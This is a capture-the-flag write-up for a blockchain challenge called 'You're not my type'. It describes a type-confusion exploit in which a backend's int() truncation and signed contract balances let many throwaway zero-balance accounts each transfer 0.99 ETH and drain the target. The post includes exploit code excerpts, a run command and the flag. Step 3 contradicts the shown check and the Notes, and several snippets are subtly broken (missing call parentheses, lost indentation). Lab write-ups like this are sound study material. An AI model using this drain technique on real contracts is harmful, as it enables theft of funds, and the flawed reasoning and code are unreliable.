---
title: "You're not my type"
ctf: "platypwnies 2026"
date: 2026-11-14
category: blockchain
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{n0t_my_typ3_0f_m0n3y::F9PGddRH88B6}"
---

# You're not my type

## Summary

`PlatyPay` (`Chal`) stores transfer amounts as **human-readable strings**, validated and
settled by `service/payment_backend.py`. The backend's overdraft check truncates the parsed
float to an integer (`int(value)`), so **any amount below 1 ether is treated as "affordable"**
even for an account with balance 0: `int(0.99) == 0`. It then settles the *full* wei value
(`int(0.99 * 10**18) = 0.99 ETH`). Because balances are `int256`, the sender simply goes
negative and the receiver is credited the full wei amount — free money, repeatable.

Win condition: `Setup.isSolved` → `address(TARGET).balance < 80 ether` (≥ 20 ETH must leave
the contract).

## Solution / Exploit

Source: `contracts/Chal.sol`, `contracts/Setup.sol`, `service/payment_backend.py`, exploit
`notmytype_exploit.py`.

### Step 1 — the type confusion in the backend

```python
def check_transfer(balance: float, amount: str):
 try:
 value = float(amount)
 except ValueError:
 return None
 if not value > 0:
 return None
 try:
 # no overdrafts!
 if balance < int(value): # <-- int(0.99) == 0, so 0 < 0 is False -> "affordable"
 return None
 except (ValueError, OverflowError):
 return None
 return value
```

```python
balance = chal.functions.balanceOf(sender).call / 10**18
value = check_transfer(balance, amount)
accepted = value is not None
amount_wei = int(value * 10**18) if accepted else 0
chal.functions.settle(next_id, accepted, amount_wei)
```

The check compares `balance` (an ether float) against `int(value)`. `int` truncates, so for
`amount = "0.99"` the comparison is `balance < 0`, which is false for any non-negative balance
— including `0`. The settled amount, however, is the untruncated `int(0.99 * 1e18)`.

### Step 2 — `settle` lets balances go negative

```solidity
function settle(uint256 id, bool accepted, uint256 amountWei) external {
 require(msg.sender == backend, "Only backend");
 ...
 if (accepted) {
 balanceOf[t.from] -= int256(amountWei); // int256: goes negative, no underflow revert
 balanceOf[t.to] += int256(amountWei);
 }
}
```

`balanceOf` is `int256`, so the sender's balance becomes negative rather than reverting. The
recipient is credited the real wei amount. (A `uint256` balance would have reverted on
underflow.)

### Step 3 — weaponise it: many zero-balance senders

A single account is capped by how small `int(value)` can be (0), i.e. any sub-1-ether amount
is free *once per transfer*, but the sender's balance goes negative each time and the check
`balance < int(value)` still passes (negative < 0 is true!). The exploit uses **N fresh
throwaway accounts**, each with `balanceOf == 0`, each sending `0.99` to the player:

```python
for i in range(n_transfers):
 a = Account.create # balanceOf[a] == 0 on chain
 # fund only gas money (0.002 ETH) from the player
 ...
 socks.append(a)

first_id = chal.functions.nextTransferId.call
for a in socks:
 send(w3, a, chal.functions.transfer(acct.address, amount)) # amount = "0.99"
```

Then wait for the backend to settle all of them and withdraw the credited balance:

```python
send(w3, acct, chal.functions.withdraw(credited))
```

`N = 22` transfers × 0.99 ETH ≈ 21.78 ETH, comfortably above the 20 ETH needed to push the
contract below 80 ETH.

### Run

```bash
RPC_URL=http://127.0.0.1:8545/<uuid> \
PRIVATE_KEY=<player key> \
SETUP_ADDRESS=<setup addr> \
FLAG='PP{n0t_my_typ3_0f_m0n3y::F9PGddRH88B6}' \
python3 notmytype_exploit.py
```

Env knobs: `N_TRANSFERS` (default 22), `AMOUNT` (default `"0.99"`).

### Expected output

No raw run log was retained; below is the literal format of the script's `print` statements
(not a captured transcript).

```
[*] TARGET 0x... balance 100000000000000000000 wei, backend 0x...
[+] 22 throwaway accounts funded
[+] 22 transfer requests created (ids 0..21)
[+] all transfers settled, collector balanceOf = 21780000000000000000 wei (21.7800 ETH)
[+] withdraw(21780000000000000000) sent, TARGET balance now ... wei
[+] isSolved = True
FLAG: PP{n0t_my_typ3_0f_m0n3y::F9PGddRH88B6}
```

## Flag(s)

```
PP{n0t_my_typ3_0f_m0n3y::F9PGddRH88B6}
```

## Notes / Pitfalls

- **`int(value)` is a truncation, not a rounding.** `int(0.999999)` is `0`; the whole exploit
 hinges on this. `AMOUNT` must stay strictly below `1.0` or the check becomes real.
- **`int256` balances are the second half of the bug.** With `uint256`, `balanceOf[from] -=
 amountWei` would underflow-revert and the transfer would fail; signed balances let the sender
 go negative silently.
- **Each sender is usable once at zero balance — hence throwaway accounts.** The exploit mints
 22 fresh EOAs (each funded only with ~0.002 ETH for gas), so each starts at `balanceOf == 0`
 and can clear the broken check.
- **The backend is the oracle/pacer.** The settle loop is asynchronous; the script polls
 `transfers(i)[3]` (the `processed` flag) until every request is settled before withdrawing.
 Timeout is 180 s.
- **`transfer` alone credits nothing** — it only enqueues a `Transfer`; the backend's
 `settle` is what moves balances. Any accepted-but-unsettled request is worthless, so the
 polling step is load-bearing.
